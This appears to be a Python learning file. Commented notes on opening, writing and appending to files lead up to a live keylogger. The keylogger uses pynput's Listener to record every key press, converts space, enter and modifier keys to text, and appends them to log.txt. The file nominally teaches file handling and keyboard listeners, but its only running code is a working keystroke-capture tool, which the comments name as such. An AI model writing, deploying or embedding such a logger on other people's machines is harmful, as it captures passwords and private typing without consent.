# storing the keystrokes in a text file
# File handling - how to read, write and append to a file

# LEC - 1 About read, write and appending  
# r - reading - gives the line as the output
# w - writing - writes the text 
# a - appending to a file - multiple strings in line

#f = open("log.txt", 'a')
#f.write("\nhiii")
    # filedata = f.read() ==> while running this replace the 'a' with 'r'
    # print(filedata)
#f.close()


# LEC - 2 

# Listeners - listen to keystrokes 
# Use of the 'with' keyword - Release memory/resources automatically

#with open("log.txt", 'a') as f:
#   f.write("hiii")

#LEC - 3 is in Control.py

#LEC 6

# listening to the keyboard (will be used in keylogger)

from pynput.keyboard import Listener

def writetofile(key):
    letter = str(key)
    letter = letter.replace("'","")
    
    if letter == 'Key.space':
        letter = ' '
        
    if letter == 'Key.shift_r':
        letter = ''
        
    if letter == "Key.ctrl_l":
        letter = ""
        
    if letter == "Key.enter":
        letter = "\n"
        
    with open("log.txt", 'a') as f:
        f.write(letter)

with Listener(on_press=writetofile) as l:
    l.join()






